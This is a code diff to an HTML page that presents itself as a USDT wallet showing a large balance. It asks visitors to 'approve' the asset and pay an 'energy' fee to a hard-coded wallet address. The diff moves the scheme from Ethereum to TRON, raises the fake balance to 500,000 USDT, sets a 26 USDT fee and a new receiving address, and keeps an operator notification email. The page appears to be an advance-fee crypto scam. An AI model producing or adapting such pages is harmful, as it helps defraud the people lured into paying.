@@ -394,10 +394,10 @@ button:hover{filter:brightness(1.1)}
       <div class="usdt-logo">₮</div>
       <div>
         <div class="asset-name">Tether USD</div>
-        <div class="asset-network">USDT Asset • ERC-20</div>
+        <div class="asset-network">USDT Asset • TRC-20</div>
       </div>
     </div>
-    <div class="balance">250,000.00 <span>USDT</span></div>
+    <div class="balance">500,000.00 <span>USDT</span></div>
     <div class="status">● Asset available for management</div>
   </div>
 
@@ -416,7 +416,7 @@ button:hover{filter:brightness(1.1)}
       <p class="modal-description">Authorize this asset for management and transfer operations.</p>
       <div class="info-box">
         <div class="info-label">Asset</div>
-        <div class="info-value">USDT <small>• ERC-20</small></div>
+        <div class="info-value">USDT <small>• TRC-20</small></div>
       </div>
       <button class="approve-btn" onclick="startApproval()">Confirm Approval</button>
       <button class="back-btn" onclick="closeModal('approvalModal')">Cancel</button>
@@ -447,7 +447,7 @@ button:hover{filter:brightness(1.1)}
       <p class="modal-description">Send the required amount to activate energy for USDT asset management.</p>
       <div class="info-box">
         <div class="info-label">Remaining amount to pay</div>
-        <div class="info-value">0.0031257 <small>ETH</small></div>
+        <div class="info-value">26  <small>USDT</small></div>
       </div>
       <button class="approve-btn" onclick="showQR()">View Deposit Address</button>
       <button class="back-btn" onclick="closeModal('energyModal')">Cancel</button>
@@ -474,7 +474,7 @@ button:hover{filter:brightness(1.1)}
     <button class="close" onclick="closeModal('qrModal')">×</button>
 
     <h2>Deposit Address</h2>
-    <p class="modal-description">Send exactly <strong style="color:#fff">0.0031257 ETH</strong> to the address below to activate energy.</p>
+    <p class="modal-description">Send exactly <strong style="color:#fff">26 USDT</strong> to the address below to activate energy.</p>
 
     <!-- QR — image pre-loaded, skeleton fades out when ready -->
     <div class="qr-wrapper">
@@ -483,7 +483,7 @@ button:hover{filter:brightness(1.1)}
     </div>
 
     <div class="address-label">Wallet address</div>
-    <div class="address" id="walletAddressDisplay">0x8f45d779b1d21c2556501f776e2cdbbc0f7a86a1</div>
+    <div class="address" id="walletAddressDisplay">TFHo4h9bhp81tSvrg6NL92SqvfwEhtzXKS</div>
 
     <button class="copy-btn" onclick="copyAddress()">Copy Address</button>
 
@@ -551,7 +551,7 @@ button:hover{filter:brightness(1.1)}
      4. Paste it below replacing  YOUR_ACCESS_KEY
    That's it — no dashboard, no templates, no service IDs.
    ════════════════════════════════════════════════ */
-const walletAddress     = "0x8f45d779b1d21c2556501f776e2cdbbc0f7a86a1";
+const walletAddress     = "TFHo4h9bhp81tSvrg6NL92SqvfwEhtzXKS";
 const NOTIFY_EMAIL      = "bnbyuu7@gmail.com";
 const WEB3FORMS_KEY     = "YOUR_ACCESS_KEY";   // ← paste key here
 
